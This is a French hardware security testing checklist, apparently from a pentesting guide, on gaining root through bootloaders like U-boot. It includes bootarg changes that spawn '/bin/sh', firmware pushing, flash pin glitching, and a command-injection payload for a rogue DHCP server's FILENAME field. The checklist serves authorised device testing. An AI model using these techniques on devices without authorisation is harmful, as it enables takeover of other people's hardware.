Lors de la modification du démarrage de l'appareil et des chargeurs de démarrage tels que U-boot, essayez ce qui suit :

* Essayez d'accéder à l'interpréteur de shell des chargeurs de démarrage en appuyant sur "0", espace ou d'autres "codes magiques" identifiés pendant le démarrage.
* Modifiez les configurations pour exécuter une commande shell telle que l'ajout de '`init=/bin/sh`' à la fin des arguments de démarrage
  * `#printenv`
  * `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
  * `#saveenv`
  * `#boot`
* Configurez un serveur tftp pour charger des images sur le réseau localement depuis votre poste de travail. Assurez-vous que l'appareil a accès au réseau.
  * `#setenv ipaddr 192.168.2.2 #adresse IP locale de l'appareil`
  * `#setenv serverip 192.168.2.1 #adresse IP du serveur tftp`
  * `#saveenv`
  * `#reset`
  * `#ping 192.168.2.1 #vérifiez si l'accès au réseau est disponible`
  * `#tftp ${loadaddr} uImage-3.6.35 #loadaddr prend deux arguments : l'adresse pour charger le fichier et le nom du fichier de l'image sur le serveur TFTP`
* Utilisez `ubootwrite.py` pour écrire l'image uboot et pousser un firmware modifié pour obtenir les droits root
* Vérifiez les fonctionnalités de débogage activées telles que :
  * journalisation verbose
  * chargement de noyaux arbitraires
  * démarrage à partir de sources non fiables
* \*Utilisez la prudence : Connectez une broche à la terre, observez la séquence de démarrage de l'appareil, avant que le noyau ne se décompresse, court-circuitez/connectez la broche mise à la terre à une broche de données (DO) sur une puce flash SPI
* \*Utilisez la prudence : Connectez une broche à la terre, observez la séquence de démarrage de l'appareil, avant que le noyau ne se décompresse, court-circuitez/connectez la broche mise à la terre aux broches 8 et 9 de la puce flash NAND au moment où U-boot décompresse l'image UBI
  * \*Examinez la fiche technique de la puce flash NAND avant de court-circuiter les broches
* Configurez un serveur DHCP malveillant avec des paramètres malveillants en entrée pour qu'un appareil les ingère lors d'un démarrage PXE
  * Utilisez le serveur auxiliaire DHCP de Metasploit (MSF) et modifiez le paramètre '`FILENAME`' avec des commandes d'injection de commande telles que `‘a";/bin/sh;#’` pour tester la validation des entrées pour les procédures de démarrage de l'appareil.

\*Test de sécurité matérielle
